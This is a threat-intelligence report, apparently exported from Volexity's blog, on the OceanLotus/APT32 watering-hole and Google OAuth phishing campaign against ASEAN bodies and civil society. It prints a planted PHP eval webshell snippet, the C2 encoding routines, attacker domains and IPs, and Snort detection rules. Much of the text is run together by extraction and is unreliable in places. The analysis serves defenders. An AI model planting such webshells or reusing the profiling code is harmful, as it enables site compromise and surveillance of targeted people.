@@ -1,0 +1,496 @@
+
+PRODUCTS 
+SERVICES 
+COMPANY 
+CONTACT 
+BLOG 
+
+
+OceanLotus Blossoms: Mass Digital Surveillance and Attacks Targeting ASEAN, Asian Nations, the Media, Human Rights Groups, and Civil Society 
+NOVEMBER 6, 2017 by Dave Lassalle, Sean Koessel, Steven Adair 
+... 
+
+SEARCH 
+
+
+RECENT POSTS 
+OceanLotus 
+Blossoms: 
+Mass 
+Digital 
+Surveillance 
+and 
+Attacks 
+Targeting 
+ASEAN, 
+Asian 
+Nations, 
+the 
+Media, 
+Human 
+Rights 
+Groups, 
+and 
+Civil 
+Society 
+
+Real 
+News, 
+Fake 
+Flash: 
+Mac 
+OS 
+X 
+Users 
+Targeted 
+
+Have 
+you 
+been 
+haunted 
+by 
+the 
+Gh0st 
+RAT 
+today? 
+
+
+SavewebpagesasPDFwithPDFmyURL
+InMay2017,Volexityidentifiedandstartedtrackingaverysophisticatedandextremely widespreadmassdigitalsurveillanceandattackcampaigntargetingseveralAsiannations, theASEANorganization,andhundredsofindividualsandorganizationstiedtomedia, humanrightsandcivilsocietycauses.Theseattacksarebeingconductedthrough numerousstrategicallycompromisedwebsitesandhaveoccurredoverseveralhigh-profile ASEANsummits.Volexityhastiedthisattackcampaigntoanadvancedpersistentthreat (APT)groupfirstidentifiedasOceanLotusbySkyEyeLabsin2015.OceanLotus,alsoknown asAPT32,isbelievedtobeaVietnam-basedAPTgroupthathasbecomeincreasingly sophisticatedinitsattacktactics,techniques,andprocedures(TTPs).Volexityworksclosely withseveralhumanrightsandcivilsocietyorganizations.Afewoftheseorganizationshave specificallybeentargetedbyOceanLotussinceearly2015.Asaresult,Volexityhasbeenable todirectlyobserveandinvestigatevariousattackcampaigns.Thisreportisbasedonavery 
+PowerDuke: 
+Widespread 
+Post-Election 
+Spear 
+Phishing 
+Campaigns 
+Targeting 
+Think 
+Tanks 
+and 
+NGOs 
+
+Virtual 
+Private 
+Keylogging: 
+Cisco 
+Web 
+VPNs 
+Leveraged 
+for 
+Access 
+and 
+Persistence 
+
+
+
+ARCHIVES 
+November 
+2017 
+July 
+2017 
+March 
+2017 
+November 
+2016 
+October 
+2015 
+July 
+2015 
+June 
+2015 
+April 
+2015 
+October 
+2014 
+September 
+2014 
+
+
+SavewebpagesasPDFwithPDFmyURLtargetedattackthatVolexityobservedandtheresearchthatfollowed. 
+KeyhighlightsofthismostrecentandongoingattackcampaignbytheOceanLotusgroup areasfollows: 
+
+Massivedigitalprofilingandinformationcollectioncampaignviastrategically compromisedwebsites Over100websitesofindividualsandorganizationstiedtoGovernment,Military, HumanRights,CivilSociety,Media,StateOilExploration,andmoreusedtolaunch attacksaroundtheglobe Useofwhiteliststotargetonlyspecificindividualsandorganizations CustomGoogleAppsdesignedforgainingaccesstovictimGmailaccountstosteale­mailandcontacts StrategicandtargetedJavaScriptdeliverytomodifytheviewofcompromised websitestofacilitatesocialengineeringofvisitorstoinstallmalwareorprovideaccess toe-mailaccounts Largedistributedattackinfrastructurespanningnumeroushostingprovidersand countries Numerousattackercreateddomainsdesignedtomimiclegitimateonlineservicesand organizationssuchasAddThis,Disqus,Akamai,Baidu,Cloudflare,Facebook,Google, andothers HeavyusesofLet’sEncryptSSL/TLScertificates Useofmultiplebackdoors,suchasCobaltStrikeandothers,believedtobedeveloped andsolelyusedbyOceanLotus 
+
+
+
+
+
+
+
+
+
+Volexitybelievesthesizeandscaleofthisattackcampaignhaveonlypreviouslybeenrivaled byaRussianAPTgroupcommonlyreferredtoasTurlaanddocumentedinareportfrom 
+
+TAGS 
+AdobeFlashAPTChinaHong 
+Kong 
+Gh0stDrupaljava 
+vulnerabilities 
+electionsexploitsosx 
+Japan 
+
+ScanboxDukesdigitalsurveillanceCisco 
+spear 
+phishing 
+VPNScanning 
+Afghanistan 
+
+
+
+SymanteccalledTheWaterbugattackgroup.TheOceanLotusthreatgrouphassuccessfully operated,largelyunnoticed,throughseveralhigh-profilewebsitessincelate2016.Volexity hasobservedthefollowingoperatingpatternfortheOceanLotusgroup: 
+
+Compromisewebsiteofstrategicimportance(e.g.websitesvisitorshaveahigher likelihoodtobetargetsofinterest) Addoneormorewebshellbackdoorstovictimwebsitestomaintainpersistence WebshellusedtoaddJavaScriptdevelopedbyOceanLotusintothewebsite ThemaliciousJavaScriptmakescallsoverHTTPorHTTPStoattackercontrolled domainstotypicallyloadoneoftwodifferentOceanLotusframeworks OceanLotusJavaScriptframeworksdesignedtotrack,profile,andtargetthe compromisedwebsite’svisitors WebsitevisitorsofinterestareflaggedfortargetingandreceivespecialJavaScript aimedatcompromisingtheuser’ssystemore-mailaccounts 
+
+
+
+
+
+
+Volexityhasalsonotedthatsomeoftheorganizationswithcompromisedwebsiteshave alsobeentargetedwithspearphishingcampaignsthatattempttoinstallbackdoorsonthe targetsystems.Spearphishingactivityanddetailedmalwareinfrastructure willbe describedinafollowonreportonOceanLotusactivity. 
+
+
+CompromisedSites 
+Volexityhasbeenabletoidentifyastaggeringlylargenumberofwebsitesthathavebeen strategicallycompromisedbytheOceanLotusattackers.Thenumberofcompromised websitesexceeds100.Theoverwhelmingmajorityofthewebsitesthathavebeen compromisedbelongtoVietnameseindividualsandorganizationsthatarecriticalofthe VietnameseGovernment.Theremainderofthecompromisedwebsitesare tiedtooneof threecountriesthatsharealandborderwithVietnamorthePhilippines.Unlikewiththe Vietnamesevictims,inmostcasesthesewebsitesaretiedtostateownedoraffiliated organizations. 
+
+Vietnam 
+VolexityhaschosennottolisttheVietnamesewebsitesthathavebeencompromised,asthe quantityisexceedinglylarge(over80)andmanyofthemaretiedtoindividualsorverysmall organizations.However,thelistbelowcharacterizesthetypesofwebsitesthathavebeen 
+victimizedtofacilitatethisongoingcampaign. 
+
+HumanRights CivilSociety News/Media(EnglishandVietnameseLanguage) 
+
+
+IndividualBloggers  
+Religion  
+ASEAN  
+Organization  Website  
+AssociationofSoutheast  asean.org  
+AsianNations(ASEAN)  
+
+CompromisedPage 
+/modules/aseanmail/js/wp­mailinglist.js /modules/wordpress­popup/inc/external/wpmu­lib/js/wpmu-ui.3.min.js 
+SavewebpagesasPDFwithPDFmyURLASEANTradeRepository 
+atr.asean.org 
+MainIndex 
+ASEANInvestment 
+investasean.asean.org 
+MainIndex 
+
+
+Cambodia 
+Organization 
+Ministryof Foreign Affairs 
+Ministryof Environment 
+Ministryof CivilService 
+National Police 
+
+Website 
+www.mfa.gov.kh 
+www.moe.gov.kh 
+www.mcs.gov.kh 
+www.police.gov.kh 
+
+CompromisedPage 
+/jwplayer.js 
+/other/js/jquery/jquery.js 
+MainIndex 
+/wp-includes/js/jquery/jquery.js?ver=1.12.4 
+SavewebpagesasPDFwithPDFmyURLMinistryof National Assembly-Senate Relationsand Inspection 
+Ministryof SocialAffairs, Veterans,and Youth Rehabilitation 
+National Election Committee 
+
+
+China 
+Organization 
+www.monasri.gov.kh 
+www.mosvy.gov.kh 
+www.necelect.org.kh 
+wtemplates/monasri_template/js/menu/mega.js 
+/public/js/default.js 
+MainIndex 
+Website 
+CompromisedPage 
+BDStarInformationService  bdstarlbs.com  MainIndex  
+Co.  
+BDStarNavigationCo.  www.navchina.com  MainIndex  
+
+SavewebpagesasPDFwithPDFmyURLChinaNationalUnitedOil Corporation 
+ChinaOilfieldServices Limited 
+ChinaNationalOffshoreOil Corporation 
+
+
+Laos 
+Organization 
+BokeoProvince 
+MinistryofPublicWorksand Transport 
+
+
+Philippines 
+Organization 
+Website 
+www.chinaoil.com.cn 
+Withheld 
+Withheld 
+
+Website 
+bokeo.gov.la www.mpwt.gov.la 
+
+CompromisedPage 
+/chinaoil/xhtml/js/jquery­1.7.2.min.js 
+Withheld 
+Withheld 
+
+CompromisedPage 
+MainIndex 
+/media/system/js/mootools­core.js 
+Armed 
+www.afp.mil.ph 
+/modules/mod_js_flexslider/assets/js/jquery.easing.js Forcesofthe Philippines Officeofthe 
+SavewebpagesasPDFwithPDFmyURLop-
+MainIndex 
+President 
+proper.gov.ph 
+
+
+
+JavaScriptTracking,Profiling,andDelivery Frameworks 
+ThecompromisedwebsitesarebeingleveragedtodelivermaliciousJavaScriptdesignedto profileandfingerprintauseroneachvisit.VolexityfoundthatOceanLotushaddeveloped twodifferentJavaScriptframeworkstoaccomplishtheirprofilingandtargetingactivities. Forthepurposesofthisblog,wewillcallthemFrameworkAandFrameworkB.Withfew exceptions,thecompromisedwebsiteswouldonlyhavecodeloadingeitherFrameworkAor FrameworkB.EachofthehostnamesandIPswerealsotiedtooneofthetwoframeworks, withnoneofthemservingupboth.Thefollowingsectionswillprovidesomedetailonthe twoframeworksandtheirmultiplescriptingcomponents. 
+FrameworkA 
+FrameworkAisfoundonalimitednumberofvictimsites.InitialURLsforaccessto FrameworkAaretypicallyformattedsimilartothefollowing: 
+cloudflare-api[.]com/ajax/libs/jquery/2.1.3/jquery.min.js?s=1&v=72580 
+Volexitybelievesthev=valueisuniqueandservesasavictimsiteidentifier,whichmaynot benecessarygiventhedatathescriptsendsalongasdetailedbelow.Theabovescriptis retrievedfollowingavisittoasean.org.Thefollowingcodehasbeenappendedtolegitimate 
+SavewebpagesasPDFwithPDFmyURLJavaScriptloadedbytheASEANwebsite: 
+
+FrameworkA,Script1–HostTracking 
+ThefirstscriptdeliveredcontainsseveralsupportfunctionssuchasanMD5function,a base64decoder,andfunctionsforloadingadditionaldata.Thegoalofthisscriptappearsto bedefiningeverythingneededtotrackahostacrossdifferentrequests. 
+Thisscriptdefinesasectionofvariablesusedinotherpartsofthecode.Thehostbased onesareobtainedfromtheUser-Agentintheinitialrequest. 
+
+ThenitwillloadasecondJavaScriptfile: 
+SavewebpagesasPDFwithPDFmyURL
+Theh1andh2valuesintherequestareMD5hashesofsomeinformationaboutthehost makingtherequest.Thefirsthash,h1,istheMD5hashofvariouspiecesofinformation collectedfromthebrowserandconcatenatedtogether. 
+
+Thesecondhash,h2,isalsoanMD5hash,butthevaluesconcatenatedarethescreenheight andwidth,timezone,plugins,MIMEtype,andlanguageinformation. 
+SavewebpagesasPDFwithPDFmyURL
+Theencryptfunctionsimplyiteratesoverthepassedstringandkeystringandaddsthe ASCIIvaluesateachposition.Pythonscriptsforencryptinganddecryptingareasfollows. 
+Encrypt: 
+#!/usr/bin/env python 
+import base64 
+import sys 
+b64_data = base64.b64encode(sys.argv[2]) 
+key = sys.argv[1] 
+enc_data = "" 
+for i, x in enumerate(b64_data): k = key[i % len(key) -1] enc_data += chr(ord(x) + ord(k)) 
+print print base64.b64encode(enc_data) print 
+SavewebpagesasPDFwithPDFmyURLDecrypt: 
+#!/usr/bin/env python 
+import base64 
+import sys 
+key = sys.argv[1] 
+b64_data = sys.argv[2] 
+enc_data = base64.b64decode(b64_data) 
+dec_data = "" 
+for i, x in enumerate(enc_data): k = key[i % len(key) -1] dec_data += chr(ord(x) -ord(k)) 
+print 
+print base64.b64decode(dec_data) 
+print 
+FrameworkA,Script2–Profiling Thesecondscriptreturnedstartsbydefiningabrowser_hashvariable.Thisiscomposedof h1andthefirst10charactersofh2,separatedby“–“.ThisscriptthensendsthreeGET requests,eachwithadparameterinthequerystringthatcontainssomeencryptedand base64encodeddata. 
+SavewebpagesasPDFwithPDFmyURLOnerequestsends“BrowserPlugins.”Theinfoiscollectedinthefollowingpartofthecode: 
+
+Anotherrequestsends“ExtendedBrowserInfo.”Thisinfoiscollectedasfollows: 
+
+Thefinalrequestsends“WebRTC”infotoobtainthehostIPaddress. 
+
+
+
+FrameworkB 
+FrameworkBisfoundonthevastmajorityofsites.InitialURLsforaccesstoFrameworkB aresimplyreferencestoJavaScript(.js)filesonOceanLotuscontrolledsites.Volexityhas foundthattheURLsfromFrameworkBdonotactuallymatter,solongasthefileextension endsin.jsandareferrerissentwiththerequest.TheJavaScriptwillbesentbackregardless ofthefileorfolderrequestedaslongasitmeetsthesetwocriteria. 
+SavewebpagesasPDFwithPDFmyURLThemainASEANwebsiteisoneofthefewplacesthatcontainbothFrameworkAand FrameworkB. ThefollowingcodehasalsobeenappendedtolegitimateJavaScriptloadedbytheASEAN website: 
+
+ThisscriptwillresultintheloadingofJavaScriptfromthefollowingURL: 
+http://ad.jqueryclick[.]com/assets/adv.js 
+FrameworkB,Script1–HostTracking 
+Thesecondframeworkcollectssimilarinformation,buthandleshosttrackingdifferently. TheinitialscriptthatisdeliveredvariesbasedonthehostOSasdeterminedfromtheUser­Agentintherequest.Whenthescriptisloaded,itfirstmakesaGETrequestto https://health-ray-id[.]com/robot.txt.ThisreturnsaUUIDthatissentinsubsequent requestsaseitherzuuidorclient_zuuid.ItisalsosavedinlocalStorageforthe compromisedsiteunderakeyofx00Sync.ThescriptthenmakestwoGETrequests. 
+Request1: 
+GET /api/<BASE64_ENCODED_DATA>/adFeedback.js 
+SavewebpagesasPDFwithPDFmyURLThebase64datadecodestoaJSONstringcontaininginformationfortrackingthehost.For example,thedatabelow,wherezuuidistheUUIDreturnedfromhealth-ray-id.com. 
+{"uuid":"62d096b35e82547b6a12607c2820f8e0","zuuid":"ca3a8d 02-a0f5-4686-9f6b-cab4a17a9e2b","hash":""} 
+Theuuidvalue(alsoseenasclient_uuidinlaterrequests)isalsogeneratedbythescript andisstoredinacookienamed___APISIDforthecompromiseddomain. Itisgenerated usingthefingerprintjs2library,whichcreatesahashbasedonbrowserinformation. Thisis anothermethodfortrackingusersacrossrequests. Thislibraryandseveralotherlegitimate JavaScriptlibraries(includingthejQuerycorelibraryandothersforreading/storing cookies,collectingtimezonedata,etc.)aretypicallydownloadedfromaCDNURLandsaved intolocalStoragevariablestobelaterusedbythescript. Theyarestoredashexencoded datainafunctioncalledx00Config. IftheclientisnotontheOceanLotuswhitelist,thisrequestjustreturnsasinglelineof JavaScriptsettingavariablenamedtimestamp.However,whentheclientisonthewhitelist, Volexityhasobservedapopupwindowthatslowlyfadesinontopofthelegitimatewebsite. Inarecentattack,thepopupappearedGooglerelatedandwouldredirecttoaGoogleOAuth pagedesignedtofooltheuserintoprovidingaccesstotheiraccounttoamaliciousGoogle App.Moredetailsonthisappearfurtherdowninthispost. 
+Request2: 
+GET 
+/sync/<BASE64 _ENCODED_DATA/img_blank.gif 
+
+
+Thisrequestcontainstwopiecesofinformation:ahistorysectionandanavigatorsection. ThehistorysectioncontainsinformationaboutthecompromisedsitethattheJavaScript wasloadedfrom.ItalsocontainscertaininformationaboutthehostincludingtheUser­Agent,timeandtimezone,andIPaddresses. 
+Thenavigatorsectionisblankthefirsttimetherequestismade.Whenthescriptisfirstrun, itrecordsthecurrenttimeinanotherlocalStoragevariable.Itonlypopulatesthe navigatorsectionif24hourshavepassed.Itwillalsoupdatethestoredtimestamp.This meansthelargesectionofdatainthenavigatorsectionisonlysentonceperday,evenif thiscompromisedsiteisvisitedmultipletimes.Thissectionincludesalotofthesame informationcollectedbyFrameworkA,includingMIMETypes,plugins,andscreen information.BelowareafewportionsofthedatacollectedandsentbacktotheOceanLotus servers. 
+SavewebpagesasPDFwithPDFmyURL
+SavewebpagesasPDFwithPDFmyURLSavewebpagesasPDFwithPDFmyURL
+FrameworkB,Script2–PopupforWhitelistedSystems 
+Asmentionedabove,ifasystemisnotonthewhitelist,theGET /api/<BASE64_ENCODED_DATA>/adFeedback.jsrequestwilljustreturnatimestamp variable.Forawhitelistedsystem,anewscriptisdelivered. Aportionofthisscriptshown belowmakesarequesttodownloadsomeadditionalconfigdata. 
+
+ThedomainfortherequestisloadedfromtheSAPIS_IDcookiewhichwassetbythefirst script.Beforestoring,itissplitintwo,thetwosubstringsarereversed,thenitisbase64 encoded.AnexampleoftheSAPIS_IDcookiecanbeseeninthenavigatorsection above. Thisultimatelycallsthee.fn_getjson()functionthatmakesarequestlikethe following: 
+SavewebpagesasPDFwithPDFmyURL
+ThisreturnsaJSONconfiglikethefollowing: 
+
+ThesearesavedandaccessedviaagetConfigs()functionfordifferentactionsthescriptcan perform. 
+Ultimately,thescriptpresentsapopupoverthesitesayingthecontentisblockedand requeststhatthevisitorsignintocontinue.Thecodebelowpresentsthispageandtracks progressusingthepostShow()andpostDown()functions,whichsendGETrequestsusing theURLsshownabove.Whenoneofthebuttonsisclicked,theuserisredirectedtologinto theapplication. 
+SavewebpagesasPDFwithPDFmyURL
+
+WhitelistedTargetingforGoogleAccountAccess 
+VolexitywasabletoworkwithorganizationsontheOceanLotuswhitelistthatreceived specialresponsesfromFrameworkB.Asaresult,Volexitywasabletodirectlyobservetwo differentOceanLotusattacksthatattemptedtofoolthetargeteduserintoprovidingaccess totheirGoogleAccounts.OceanLotusattemptstocompromiseGoogleAccountsby promptingtheuserwithapopupdirectingthemtoprovideOAuthauthorizationstoa maliciousGoogleApp. 
+Onceauserhasbeenflaggedfortargeting,theywillreceiveapopupwhenaccessingan OceanLotuscompromisedwebsiteonceevery24hours.Thispopupslowlyfadesinovertop ofthelegitimatewebsiteandappearsquitelegitimate.Screenshotsoftwodifferent observedpopupsareshownbelow. 
+
+Version 
+1: 
+Locked 
+Content 
+Version 2: Chrome Sign In 
+
+
+Regardlessofwhichoptiontheuserclicks,theyareredirectedtoGoogletoinitiateOAuth accesstooneofOceanLotus’GoogleApps.Belowisascreenshotofwhatauserwouldsee priortoauthorizingthethenefariousGoogleApp. 
+SavewebpagesasPDFwithPDFmyURL
+OceanLotus Google App OAuth 
+SavewebpagesasPDFwithPDFmyURLIfthetargeteduserchoosesALLOW,theOceanLotusGoogleAppimmediatelylogsintothe accountandstartsaccessingit.Theaccounthaspermissionstoaccessalle-mailand contacts,whichisalltheaccessOceanLotusneedstoconductdigitalsurveillance.Volexity stronglyrecommendsthatanyonethatthinkstheymayhavebeentargetedwiththis campaignorsimilarattacksreviewtheDefenseAgainstOceanLotussectionbelow. 
+OceanLotusisalsoknowntobedistributingmalwareintheformoffakeInternetExplorer, Chrome,andFirefoxupdates.Volexityhasobservedsimilarattacksviaspearphishing againsttargetedorganizationsthatleveragesomeofthesamemalwareinfrastructure.In thesecases,thefollowingAmazonS3bucketswereusedtodistributethemalwarethrough JavaScriptaspartofOceanLotusFrameworkBordirectlinksfromspearphishing campaigns. 
+
+dload01.s3.amazonaws.com download-attachments.s3.amazonaws.com 
+
+VolexityhasobservedmultiplecustommalwarefamiliesandCobaltStrikedelivered throughthesecampaigns.Detailsontheobservedmalwaresamplesareforthcoming. 
+
+VictimWebsitesBackdoored 
+Volexityhasworkedwithmultiplevictimorganizationstoassistwithincidentresponse effortsandtoremedytheircompromisedsystems.Thisprocessleadtotheidentificationof differentwaystheOceanLotusgroupgainsaccesstothecompromisedwebsitesandhow theymaintainaccess. 
+InitialCompromise 
+SavewebpagesasPDFwithPDFmyURLVolexityhasobservedOceanLotuscompromisingsitesoneoftwoways: 
+1. 
+Directuseraccountaccesstothewebsite’scontentmanagementsystem(CMS) 
+
+2. 
+Exploitationofoutdatedpluginsand/orCMScomponents 
+
+
+Itiscurrentlyunknownhowtheintrudersgainworkingcredentialstothevictimwebsites. BasedontheTTPsleveragedbyOceanLotus,itispossiblethatcredentialscouldhavebeen sociallyengineered(phished)fromthevictimsorthatthesystemadministratorshavebeen backdooredandakeyloggerhasassistedincapturingthelogincredentials.Alternatively,it ispossiblethatsomeofthecredentialsweresimplyguessed.SeveraloftheVietnamese websitesarerunningonGoogle’sBlogspotplatform,soitisreasonabletobelievethatthose users’Googleaccountsmaybecompromised.Inthecaseofexploitation,theCMSsoftware usedbythevictimorganizationswasoftenwoefullyoutofdate.Boththecorecomponents andaddedpluginshadremotelyexploitablevulnerabilitiesthatleadtocompromise. 
+PersistentAccess 
+Inallexaminedcases,OceanLotusattackersaddedPHPwebshellstothevictimwebsites.In mostcases,theintrudersaddedanewfilethatwasdesignedtoblendinwiththeweb directoryinwhichitwasplaced.Insomecases,VolexityobservedOceanLotusaddingPHP codetoanexistinglegitimatefilealreadyonthewebserver. 
+if(@$_POST['<variable-1>']&&@md5(md5($_POST['<variable­2>']))=='<md5 hash>') { $x="\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65"; @eval($x($_POST['<variable-1>']));exit(); 
+SavewebpagesasPDFwithPDFmyURLThehexcodestoragein$xtranslatestobase64_decode.Thiscodecheckstoseeifvariable­1issetandthenvalidateswhethertheMD5oftheMD5ofthevaluesetforvariable-2 matchesanexpectedMD5hash.Ifthesebothevaluateastrue,thecontentsofvariable-1are base64decodedandevaluatedonthesystem.Thisisasimplewebshellthat,similartoa ChinaChoppershell,allowsdirectexecutiononthesystemundertheprivilegesofthe accountrunningthewebserver.TheOceanLotusintrudersusetheseshellstointeractwith thesystemandupdatetheirJavaScriptcodeonthevariouswebsites. 
+OceanLotusalsoappearstohaveapotentiallyautomatedprocessthatperiodicallychecksif thewebshellsarestillpresentonthevictimsystems. 
+
+
+
+CampaignInfrastructure 
+Volexityhasidentifiedavastandsprawlingamountofinfrastructureleveragedby OceanLotusasapartofthisstrategicwebcompromisecampaign.Thereareevenmore indicatorsassociatedwithvariousmalwarecampaignsthatVolexitywilldetailinanother OceanLotusposttofollow.OceanLotus’sattackinfrastructurehasseveralunique characteristics,whichmakesiteasytoidentifyifaparticularsystemisundertheircontrol. Asaresult,Volexitywasabletoidentifynumeroussystemsthatwerenotdirectlyobserved inactiveattacksbutarestronglybelievedtobetiedtoOceanLotus.Inthesectionsbelow, theinfrastructurehasbeenseparatedintoactiveandinactive/unknowncategories.Ifthe infrastructureislistedasactive,thismeansthatVolexityhasdirectlyobservedthe hostname’suseinanattack.Iftheinfrastructureislistedasinactive/unknown,thismeans thatVolexityfoundevidencethehostnamewasusedinapastattackbutisnolongerinuse orithasneverbeenobservedinadirectattackbuthasuniquecharacteristicsindicativeof OceanLotusinfrastructure. 
+SavewebpagesasPDFwithPDFmyURLActive 
+Hostname 
+a.doulbeclick.org ad.adthis.org ad.jqueryclick.com api.querycore.com browser­
+extension.jdfkmiabjpfjacifcmihfdjhpnjpiick.com cdn-js.com cdn.adsfly.co cdn.disqusapi.com cloudflare-api.com cory.ns.webjzcnd.com googlescripts.com health-ray-id.com 
+
+IPv4Address 
+45.76.147.201 45.77.39.101 64.62.174.146 64.62.174.41 79.143.87.174 
+128.199.227.80 45.32.100.179 45.76.179.28 45.32.105.45 139.59.223.191 45.114.117.164 138.197.236.215 
+
+IPv6Address 
+2001:19f0:4400:48ea:5400:ff:fe71:3201 2001:19f0:4400:48fd:5400:ff:fe71:3202 N/A N/A N/A 
+N/A 2001:19f0:4400:4798:5400:ff:fe71:3200 2001:19f0:4400:4989:5400:ff:fe71:3204 NA NA NA 2604:a880:2:d0::378c:e001 
+SavewebpagesasPDFwithPDFmyURLhit.asmung.net  45.32.114.49  NA  
+jquery.google-script.org  45.32.105.45  NA  
+js.ecommer.org  45.76.179.151  2001:19f0:4400:48fd:5400:ff:fe71:3202  
+s.jscore-group.com  64.62.174.17  NA  
+s1.gridsumcontent.com  103.28.44.112  NA  
+s1.jqueryclick.com  64.62.174.145  NA  
+ssl.security.akamaihd-d.com  37.59.198.131  NA  
+stat.cdnanalytic.com  203.114.75.22  NA  
+stats.widgetapi.com  64.62.174.99  NA  
+track-google.com  203.114.75.73  NA  
+update.security.akamaihd-d.com  89.33.64.207  N/A  
+update.webfontupdate.com  188.166.219.18  2400:6180:0:d0::4315:d001  
+wiget.adsfly.co  45.32.100.179  2001:19f0:4400:4798:5400:ff:fe71:3200  
+www.googleuserscontent.org  139.59.217.207  2400:6180:0:d0::4315:7001  
+
+SavewebpagesasPDFwithPDFmyURL
+
+Inactive/UnknownStatus 
+Volexitywasabletoidentifyasubstantialamountofinfrastructurethatbelongsto OceanLotusthatissetupinamannerconsistentwiththeabovehostnames.However, Volexityhasnotdirectlyobservedattacksleveragingthesehostnames. 
+Hostname 
+ad.linksys-analytic.com ads.alternativeads.net api.2nd-weibo.com api.analyticsearch.org api.baiduusercontent.com api.disquscore.com api.fbconnect.net* cache.akamaihd-d.com cloud.corewidget.com core.alternativeads.net 
+
+IPv4Address 
+64.62.174.16 45.77.39.101 64.62.174.146 64.62.174.41 79.143.87.174 128.199.227.80 sinkholed 89.33.64.232 139.59.217.207 139.59.220.12 
+
+IPv6Address 
+N?A 2001:19f0:4400:48fd:5400:ff:fe71:3202 N/A N/A N/A N/A N/A N/A 2400:6180:0:d0::4315:7001 2400:6180:0:d0::4315:9001 
+SavewebpagesasPDFwithPDFmyURLd3.advertisingbaidu.com  139.59.223.191  NA  
+eclick.analyticsearch.org  64.62.174.21  N/A  
+google-js.net  45.32.105.45  NA  
+google-js.org  45.32.105.45  NA  
+google-script.net  45.32.105.45  N/A  
+gs.baidustats.com  103.28.44.115  NA  
+linked.livestreamanalytic.com  139.59.220.10  2400:6180:0:d0::4315:8001  
+linksys-analytic.com  64.62.174.17  NA  
+live.webfontupdate.com  188.166.219.18  2400:6180:0:d0::4315:d001  
+static.livestreamanalytic.com  139.59.220.10  2400:6180:0:d0::4315:8001  
+stats.corewidget.com  139.59.217.207  2400:6180:0:d0::4315:7001  
+update.akamaihd-d.com  37.59.198.130  NA  
+update.webfontupdate.com  188.166.219.18  2400:6180:0:d0::4315:d001  
+upgrade.liveupdateplugins.com  128.199.90.216  2400:6180:0:d0::4315:c001  
+widget.jscore-group.com 
+ 64.62.174.9  NA  
+
+
+
+
+
+DefendingAgainstOceanLotus 
+Whilethedescribedattackcampaignreliesonfoolingauser,thepopupsonthewebsites arequiteconvincingandlegitimatelooking.Asaresult,Volexitywouldrecommend immediatelyputtinginblocksorsinkholesforthedomainsandIPaddresseslistedaboveto preventprofilingandpossibleexploitation.Theobservedattacksthusfarhavereliedon socialengineeringcampaigns;however,itwouldbetrivialforOceanLotustointroducean exploitintothischain.Asformalwareindicators,Volexitywillbeprovidingadditionaldata relatedtomalwareandbackdoorinfrastructureinafuturewrite-uptofollowsoon. 
+WhenitcomestoGoogleaccounts,Volexitywouldrecommendthatusersenablethe2-Step 
+Authentication.ThisisaneffectivewaytopreventaccesstoaGoogleaccountshouldthe 
+passwordbecompromised.However,inthecaseofthisOceanLotuscampaign,the attackersareleveragingaGoogleAppthathasOAuthauthorizedaccesstothevictim’se­mailandcontacts.Thiseffectivelybypasses2-Stepauthenticationasaresult.Usersshould beverycarefultoonlyauthorizelegitimateandknownGoogleApps.Userscanverifywhat GoogleAppshaveaccesstotheiraccountbyvisitingthefollowingURL: 
+
+https://myaccount.google.com/u/1/permissions 
+ThiswilllisttheGoogleAppswithaccesstotheaccountalongwiththeirpermissionlevels.It ispossibletodefendagainstunauthorizedapplicationsandincreaseaGoogleAccounts securitythroughtheGoogleAdvancedProtectionProgramaswell 
+UserscanfurtherverifywhatGoogleAppsanddevicesareaccessingtheiraccountviathe 
+SavewebpagesasPDFwithPDFmyURLfollowingsteps: 
+
+LogintoGmailfromawebbrowserviahttps://mail.google.com ScrolltothebottomofthepageandclickDetailstoseealistofrecentaccessestothe account 
+
+Ifanyaccessstandsoutascomingfromanunauthorizedapplicationoraddress,the guidanceinthestepsonthefollowingpageshouldbereviewed: 
+
+https://support.google.com/mail/answer/7036019 
+Finally,forwebsiteadministrators,thekeyrecommendationsareasfollows: 
+
+UsestrongpasswordsforCMSandsystemauthentication RestrictaccesstothesystemandCMSfunctionalityasmuchaspossible(limitedusers, ACLs,etc.) Implementtwo-factor(2FA)wherepossible Keepoperatingsystems,CMSsoftware,andCMSpluginsup-to-date Disableorremoveanyaccountsthatarenolongerneededorareunrecognized 
+
+
+
+
+NetworkSignatures 
+InadditiontothedomainsandIPaddresses,thefollowingnetworksignaturescanbeused todetectvariousOceanLotusprofilingandtargetingactivity. 
+alerthttp$HOME_NETany->$EXTERNAL_NETany(msg:”Volex–OceanLotus JavaScriptLoad(connect.js)”;flow:to_server,established;content:”GET”; http_method;content:”connect.js?timestamp=”;http_uri;sid:2017083001;) 
+SavewebpagesasPDFwithPDFmyURLalerthttp$EXTERNAL_NETany->$HOME_NETany(msg:”Volex–OceanLotus JavaScriptFakePageURLBuilderResponse”;flow:to_client,established; file_data;content:”{|22|link|22|:|22|http”;depth:13;file_data;content:”|22|load|22|”; sid:2017083002;rev:1;) 
+alerthttp$EXTERNAL_NETany->$HOME_NETany(msg:”Volex–OceanLotusSystem ProfilingJavaScript(linkStorage.x00SOCKET)”;flow:to_client,established;file_data; content:”linkStorage.x00SOCKET”;sid:2017083003;) 
+
+
+Conclusion 
+VolexitybelievestheOceanLotusthreatgrouphasrapidlyadvanceditscapabilitiesandis nowoneofthemoresophisticatedAPTactorscurrentlyinoperation.WhileVolexitydoes nottypicallyengageinattemptingattributionofanythreatactor,Volexitydoesagreewith previouslyreportedassessmentsthatOceanLotusislikelyoperatingoutofVietnam.Thisis largelyduetotheextremeandwide-scalenatureofcertaintargetingthatwouldbe extremelyunlikelytoalignwiththeinterestsofthoseoutsideofVietnam.Asaresult,Volexity believesthatOceanLotushasbeenrapidlydevelopingahighlyskilledandorganized computernetworkexploitation(CNE)capability. 
+APT,Cambodia,Laos,OceanLotus,Philippines,Vietnam 
+
+SavewebpagesasPDFwithPDFmyURLABOUT SOLUTIONS CONTACT 
+About 
+Us 
+ Request 
+A 
+Demo 
+ .  11654PlazaAmericaDr#774  
+Blog 
+ Products 
+ Reston,VA20190-4700  
+Privacy 
+Policy 
+ Services 
+ 
+. 1-888-825-1975  
+CONNECT  
+
+
+.... 
+
+©2018Volexity.AllRightsReserved. 
+SavewebpagesasPDFwithPDFmyURL
+
